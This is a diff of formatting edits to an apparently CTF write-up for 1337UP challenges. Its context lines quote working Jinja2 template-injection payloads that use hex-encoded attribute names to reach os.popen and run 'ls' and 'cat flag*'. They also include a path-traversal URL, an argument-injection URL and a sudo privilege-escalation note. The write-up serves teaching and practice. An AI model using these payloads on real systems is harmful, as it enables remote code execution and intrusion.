@@ -489,7 +489,7 @@ in this case, we can work our way towards popen. Popen will let us create a proc
 read it's output for a lot of common system commands. First, to create a injection to
 list directory contents and get our bearings
 
->\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()\}\}
+>\{\{request\|attr('application')\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')\|attr('popen')('ls')\|attr('read')()\}\}
 
 
 [![Dir Contents](/assets/1337UPCTF/1truth2.png)](/assets/1337UPCTF/1truth2.png)
@@ -498,7 +498,7 @@ list directory contents and get our bearings
 
 Next, we just need to read the flag file and the challenge should be complete.
 
->\{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat%20flag*')|attr('read')()\}\}
+>\{\{request|attr('application')\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')\|attr('popen')('cat%20flag*')\|attr('read')()\}\}
 
 [![Flag](/assets/1337UPCTF/1truth3.png)](/assets/1337UPCTF/1truth3.png)
 <figcaption align=center><b>Figure 3.3: Results of the Final Injection in Burp Suite</b></figcaption>
@@ -596,7 +596,7 @@ might come in handy later. Next, we can try out pictures.php
 Using the data we gathered from cat_info.php we have a path to a cute cat `assets/1.jpg`.
 When we visit the above URL we get the following output:
 
-[![Cute Cat](/assets/1337UPCTF/lovelycat3.png)](/assets/1337UPCTF/lovelycat3.png)
+<div align="center"><a href="/assets/1337UPCTF/lovelycat3.png"><img src="/assets/1337UPCTF/lovelycat3.png"></a></div>
 <figcaption align=center><b>Figure 4.2: A Cute Cate Picture</b></figcaption>
 &nbsp;
 
@@ -606,7 +606,7 @@ a cat path. How about the pictures script?
 
 >https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=pictures.php
 
-[![Download](/assets/1337UPCTF/lovelycatx.png)](/assets/1337UPCTF/lovelycatx.png)
+<div align="center"><a href="/assets/1337UPCTF/lovelycatx.png"><img src="/assets/1337UPCTF/lovelycatx.png"></a></div>
 <figcaption align=center><b>Figure 4.3: Pending Download for pictures.php with an Interesting File Name</b></figcaption>
 &nbsp;
 
@@ -690,7 +690,7 @@ There are a couple of ways to go from here. We could use strings to look for hin
 decompile the program to find hints. I chose to decompile it to see the logic a tiny bit better.
 Either way works just fine though.
 
-[![Main](/assets/1337UPCTF/lovelykitten1.png)](/assets/1337UPCTF/lovelykitten1.png)
+<div align="center"><a href="/assets/1337UPCTF/lovelykitten1.png"><img src="/assets/1337UPCTF/lovelykitten1.png"></a></div>
 <figcaption align=center><b>Figure 5.1: A Segment From the Decompiled Program</b></figcaption>
 &nbsp;
 
@@ -699,7 +699,7 @@ seen but `-h` can also be used to get some help info. Let's see if it works on t
 
 >https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-h
 
-[![Cat Help](/assets/1337UPCTF/lovelycats.png)](/assets/1337UPCTF/lovelycats.png)
+<div align="center"><a href="/assets/1337UPCTF/lovelycats.png"><img src="/assets/1337UPCTF/lovelycats.png"></a></div>
 <figcaption align=center><b>Figure 5.2: Main's Help Menu</b></figcaption>
 &nbsp;
 
@@ -761,7 +761,7 @@ do
 done
 ```
 
-[![Root Contents](/assets/1337UPCTF/lovelycats2.png)](/assets/1337UPCTF/lovelycats2.png)
+<div align="center"><a href="/assets/1337UPCTF/lovelycats2.png"><img src="/assets/1337UPCTF/lovelycats2.png"></a></div>
 <figcaption align=center><b>Figure 5.3: The Contents of the Root Directory</b></figcaption>
 &nbsp;
 
@@ -810,7 +810,7 @@ Using `sudo -l` we can find that our current user (www-data) has permissions to
 `sudo su` as user "level1" without a password. A very simple privilege escalation but
 we take all the wins we can get.
 
-[![Flag](/assets/1337UPCTF/lovelycats4.png)](/assets/1337UPCTF/lovelycats4.png)
+<div align="center"><a href="/assets/1337UPCTF/lovelycats4.png"><img src="/assets/1337UPCTF/lovelycats4.png"></a></div>
 <figcaption align=center><b>Figure 6.1: Reading the Flag File</b></figcaption>
 &nbsp;
 
